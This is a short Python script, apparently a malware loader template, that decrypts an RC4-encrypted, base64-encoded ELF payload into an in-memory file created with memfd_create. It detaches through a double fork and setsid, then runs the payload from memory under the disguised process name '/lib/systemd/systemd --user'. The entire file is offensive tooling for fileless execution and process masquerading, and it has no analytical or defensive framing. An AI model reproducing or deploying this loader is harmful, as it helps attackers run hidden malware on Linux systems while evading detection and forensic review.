#!/usr/bin/python3

import ctypes
import os
import sys
import base64

from arc4 import ARC4

ELF_BIN = "ELF_BINARY"
PROC_NAME = "/lib/systemd/systemd"
PROC_ARG = "--user"
KEY = "DECRYPT_KEY"

with open(ELF_BIN,'rb') as runner:

    elf = CRYPTED_ELF
    fd = ctypes.CDLL(None).syscall(319,"",1)

    with open('/proc/self/fd/'+str(fd),'wb') as final_fd:
        arc4 = ARC4(KEY)
        final_fd.write(base64.b64decode(arc4.decrypt(elf)))

    fork1 = os.fork()

    if 0 != fork1:
        os._exit(0)

    ctypes.CDLL(None).syscall(112)
    fork2 = os.fork()

    if 0 != fork2:
        os._exit(0)

    os.execl('/proc/self/fd/'+str(fd), PROC_NAME, PROC_ARG)
